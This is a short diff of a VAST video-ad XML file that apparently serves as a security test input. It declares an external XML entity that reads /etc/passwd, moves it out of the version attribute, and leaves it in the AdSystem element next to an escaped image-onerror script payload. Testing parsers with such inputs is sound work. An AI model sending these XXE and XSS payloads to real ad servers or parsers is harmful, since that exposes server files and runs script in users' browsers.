@@ -1,7 +1,7 @@
 <!DOCTYPE VAST [
   <!ENTITY xxe SYSTEM "file:///etc/passwd">
 ]>
-<VAST version="&xxe;">
+<VAST version="3.0">
   <Ad id="123456">
     <InLine>
       <AdSystem version="1.0">AdServer05&xxe;test&lt;img src=1 onerror=alert()&gt;&lt;Example</AdSystem>
